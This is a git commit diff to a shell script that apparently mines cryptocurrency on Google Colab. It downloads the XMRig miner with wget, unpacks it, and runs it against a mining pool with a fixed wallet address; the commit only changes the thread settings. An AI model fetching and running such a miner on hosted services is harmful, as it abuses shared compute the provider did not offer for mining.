4d0e7fc276340582bd16d90b05854ec4b274ed1e
fluffy199 <96822759+fluffy199@users.noreply.github.com>
2022-06-06 18:15:09 -0500

    Update gcolab-xmrig-us.sh

--- gcolab-xmrig-us.sh
+++ gcolab-xmrig-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig -o rx.unmineable.com:3333 -u NANO:nano_3oucbii6419eftqmpwrw6x3f978uag5y1ee56b5h1ozd9nxyoy7uk3nc7xgz  --randomx-init=1 --argon2-impl=AVX2 --cpu-memory-pool=1 --cpu-max-threads-hint=100 --randomx-mode=FAST --verbose
+./xmrig -o rx.unmineable.com:3333 -u NANO:nano_3oucbii6419eftqmpwrw6x3f978uag5y1ee56b5h1ozd9nxyoy7uk3nc7xgz  --threads 30 --cpu-affinity -1
